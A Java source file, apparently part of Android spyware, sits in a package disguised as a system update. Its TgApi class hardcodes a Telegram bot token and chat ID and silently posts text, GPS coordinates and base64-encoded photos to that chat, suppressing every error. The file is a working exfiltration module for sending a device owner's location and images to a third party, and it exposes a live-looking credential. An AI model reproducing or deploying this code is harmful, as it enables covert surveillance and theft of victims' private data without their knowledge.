package com.system.update;
import java.io.*;
import java.net.*;
public class TgApi {
    public static final String BOT_TOKEN = "8770131403:AAFDUYNJXtH4Trw5L57jC6y8knNZEhEN_wI";
    public static final String CHAT_ID = "8623970293";
    public static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;
    public static String get(String url){
        try{
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(15000);
            c.setReadTimeout(35000);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while((l=r.readLine())!=null) sb.append(l);
            r.close();
            return sb.toString();
        }catch(Exception e){ return ""; }
    }
    public static void postJson(String url, String body){
        try{
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type","application/json; charset=utf-8");
            c.setDoOutput(true);
            c.getOutputStream().write(body.getBytes("UTF-8"));
            c.getResponseCode();
        }catch(Exception e){}
    }
    public static void send(String text){
        if(text == null) text = "";
        if(text.length() > 4000) text = text.substring(0, 4000);
        try{
            org.json.JSONObject j = new org.json.JSONObject();
            j.put("chat_id", CHAT_ID);
            j.put("text", text);
            postJson(API+"/sendMessage", j.toString());
        }catch(Exception e){}
    }
    public static void sendLoc(double lat,double lon){
        try{
            org.json.JSONObject j = new org.json.JSONObject();
            j.put("chat_id", CHAT_ID);
            j.put("latitude", lat);
            j.put("longitude", lon);
            postJson(API+"/sendLocation", j.toString());
        }catch(Exception e){}
    }
    public static void sendPhoto(String b64, String cap){
        try{
            org.json.JSONObject j = new org.json.JSONObject();
            j.put("chat_id", CHAT_ID);
            j.put("photo","data:image/jpeg;base64,"+b64);
            j.put("caption", cap);
            postJson(API+"/sendPhoto", j.toString());
        }catch(Exception e){}
    }
}
